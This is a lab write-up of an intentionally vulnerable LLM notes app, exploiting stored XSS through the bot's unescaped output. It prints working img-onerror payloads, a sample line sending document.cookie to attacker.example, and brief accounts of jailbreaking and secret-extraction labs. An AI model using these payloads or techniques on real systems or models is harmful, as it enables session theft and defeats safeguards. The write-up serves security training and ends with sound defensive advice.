---
title: "Exploiting a Stored XSS in an LLM-Powered Notes App"
date: 2026-11-21
draft: false
tags: ["llmvault", "owasp-llm-top-10", "llm05", "xss", "ai-security", "write-up"]
description: "Write-up of an LLMVault lab (The Note Keeper, OWASP LLM05: Improper Output Handling): stored XSS through a notes bot, DOM reconnaissance and flag exfiltration."
---

*Write-up of a challenge from the LLMVault lab (OWASP LLM Top 10 2025, LLM05: Improper Output Handling)*

## Context

As part of my specialization in cybersecurity and AI, I'm training on **LLMVault**, a hands-on lab series based on the OWASP LLM Top 10 (2025). Each lab has you interact with a vulnerable bot to understand one class of vulnerability specific to LLM applications.

Before reaching this challenge, I had worked through several labs in the series:

- **LLM01: Prompt Injection** (*Roleplay Unchained*): get a guarded bot to adopt a persona, then push it out of its safety role through gradual escalation over several turns.
- **LLM02: Sensitive Information Disclosure** (*Death by a Thousand Hints*): a bot that refuses to reveal a secret directly but agrees to answer character by character, so the secret can be rebuilt from small, "harmless" requests.
- **LLM03: Supply Chain** (*The Tampered Registry*): comparing deployed hashes with canonical hashes to detect an AI model that was swapped in a deployment chain.
- **LLM04: Data and Model Poisoning** (*Teach Me Wrong*): progressively poisoning a filter that learns from user feedback until it classifies a dangerous command as safe.

This write-up covers the fifth challenge, **LLM05: Improper Output Handling**. The flaw is a classic web vulnerability (XSS), but it is triggered through the output of a conversational bot.

## The lab

The challenge features **NoteBot**, a small chat assistant with two commands: `save note: ...` to store a note and `read note` to display it. The lab's instruction was simple: *"There is a hidden element on this page."*

This kind of prompt, combined with a bot that "replays" what you give it, is a classic signal. The question to ask is not *what do I ask the bot?*, but *how does the bot display what I give it?*

## Diagnosis: unfiltered output

When an application displays text provided by a user, the best practice is to **escape** it: convert special characters such as `<` and `>` into HTML entities (`&lt;`, `&gt;`) so they are shown as-is instead of being interpreted as code.

NoteBot doesn't do that. It most likely inserts the note directly with something like `element.innerHTML = note`, without sanitization. One request is enough to check:

```
save note: <b>test</b>
read note
```

If the word "test" shows up in bold rather than literally, it's confirmed: the bot's output is injected as-is into the DOM. That's a **stored XSS**: the payload is persistent (stored server-side or in the session) and runs every time the note is read.

## Exploitation: why `<img onerror=...>` instead of `<script>`

The usual reflex for injecting JavaScript is to think of the `<script>` tag. But browsers do not execute JavaScript in a `<script>` tag that is inserted after the fact through `innerHTML`. This is a native DOM protection.

**Event-handler attributes** (`onerror`, `onload`, `onclick`...), however, do run, even in this context. Hence the classic workaround:

```html
<img src=x onerror="/* JS code here */">
```

`src=x` points to an invalid resource. The browser fails to load the image, automatically fires the `onerror` event, and runs the JavaScript placed in it. We never explicitly ask the browser to execute a script: we cause an error whose native handling becomes the execution vector.

## Reconnaissance: finding the needle in the page

First attempt, too broad:

```html
<img src=x onerror="document.querySelectorAll('[style*=display]').forEach(e=>e.style.display='block')">
```

Result: everything hidden on the page became visible, including an unrelated congratulations card normally reserved for completing the whole course. Noise, not signal.

A more targeted approach: filter by keyword instead of revealing everything at once.

```html
<img src=x onerror="alert(Array.from(document.querySelectorAll('*')).filter(e=>/flag|secret|vault/i.test(e.id+e.className)).map(e=>e.outerHTML.slice(0,100)).join('\n'))">
```

This time, one specific element stands out:

```html
<div class="secret-flag sf-hidden">🚩 Hidden element revealed via your injection — LLMVAULT{...}</div>
```

## Exfiltration: the truncation trap

On my first read through `alert(...)`, the flag appeared truncated. At first I suspected `alert()`, a basic dialog that isn't designed for long strings. But the real cause was in my own filter: I had written `e.outerHTML.slice(0,100)`, which deliberately cuts every element to 100 characters. Since the text before the flag already takes more than 80 characters, the end of the flag fell beyond the limit. Removing `.slice(0,100)` would have been enough.

The lesson: when an output looks truncated, check your own code before blaming the display tool.

To get the whole flag reliably, another approach is not to display it at all, but to **copy it straight to the clipboard**:

```html
<img src=x onerror="navigator.clipboard.writeText(document.querySelector('.secret-flag').textContent)">
```

`document.querySelector('.secret-flag')` targets the element found earlier, `.textContent` extracts its full text, and `navigator.clipboard.writeText(...)` places it in the system clipboard. A simple `Cmd+V` then gives the complete string, with no truncation.

## Why this is realistic

This challenge faithfully reproduces a real attack pattern:

1. **Flaw**: unsanitized output, whether it comes from a user or, as here, from an LLM that returns content without filtering.
2. **Injection**: a diverted vector (`onerror`) to get around the native protections on `<script>`.
3. **Reconnaissance**: a targeted search in the DOM rather than a brute-force sweep.
4. **Exfiltration**: a reliable way to retrieve the data in full.

In a real setting, an attacker usually doesn't stop at an `alert()` proof of concept. They go after session cookies, authentication tokens or sensitive data, and quietly send them to a server they control, for example:

```javascript
fetch('https://attacker.example/collect?data=' + document.cookie)
```

## Defensive takeaways

- **Escape all output systematically** before displaying it: use `textContent` instead of `innerHTML` when the content doesn't need to be interpreted as HTML.
- **Sanitize HTML** if rich markup is really needed, using a dedicated library (DOMPurify, for example), never by hand.
- **Set a Content Security Policy (CSP)** that forbids inline scripts and restricts executable sources.
- **Never trust an LLM's output**, just as you wouldn't trust user input: a model that returns "stored" content remains an injection vector if nothing filters what it sends back.

---

*This write-up is part of my exploration of the LLMVault lab, which covers the OWASP LLM Top 10 (2025) vulnerabilities. LLMVault is a project by CyberSunil (MIT license): <https://github.com/CyberSunil/LLMVault>. It is intentionally vulnerable: everything described here was done on a local instance, for learning purposes. Never test these techniques on a system you don't own or without written authorization.*
